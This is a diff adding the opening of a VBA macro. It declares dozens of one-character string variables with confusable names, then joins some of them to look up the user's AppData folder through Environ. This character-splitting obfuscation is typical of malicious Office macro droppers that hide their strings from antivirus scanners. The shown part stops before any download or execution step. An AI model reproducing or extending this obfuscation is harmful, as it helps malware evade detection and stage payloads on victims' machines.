@@ -1,0 +1,40 @@
+﻿
+
+Dim xx0101 As String: xx0101 = "A"
+Dim xx00101 As String: xx00101 = "a"
+Dim xx0104 As String: xx0104 = "d"
+Dim xx0105 As String: xx0105 = "e"
+Dim xx01007 As String: xx01007 = "u"
+Dim xx01008 As String: xx01008 = "v"
+Dim xx010a010x As String: xx010a010x = "ax"
+Dim xx0109 As String: xx0109 = "i"
+Dim xx01005 As String: xx01005 = "s"
+Dim xx01006 As String: xx01006 = "t"
+Dim xx010003 As String: xx010003 = "z"
+Dim xx010a007x As String: xx010a007x = "az"
+
+Dim xx01001 As String: xx01001 = "o"
+Dim xx0106 As String: xx0106 = "f"
+Dim xx0107 As String: xx0107 = "g"
+Dim xx0108 As String: xx0108 = "h"
+Dim xx010002 As String: xx010002 = "y"
+Dim xx01004 As String: xx01004 = "r"
+
+Dim xx01010 As String: xx01010 = "j"
+Dim xx01011 As String: xx01011 = "k"
+Dim xx010l2 As String: xx010l2 = "l"
+Dim xx01013 As String: xx01013 = "m"
+Dim xx0100x1 As String: xx0100x1 = "."
+Dim xx01009 As String: xx01009 = "w"
+Dim xx010001 As String: xx010001 = "x"
+
+Dim xx01000 As String: xx01000 = "n"
+Dim xx0102 As String: xx0102 = "b"
+
+Dim xx01002 As String: xx01002 = "p"
+Dim xx0103 As String: xx0103 = "c"
+Dim xx010q03 As String: xx010q03 = "q"
+Dim xx010l03 As String: xx010l03 = "\"
+
+
+Dim fpx As String: fpx = Environ(xx0101 & xx01002 & xx01002 & xx0104 & xx00101 & xx01006 & xx00101)
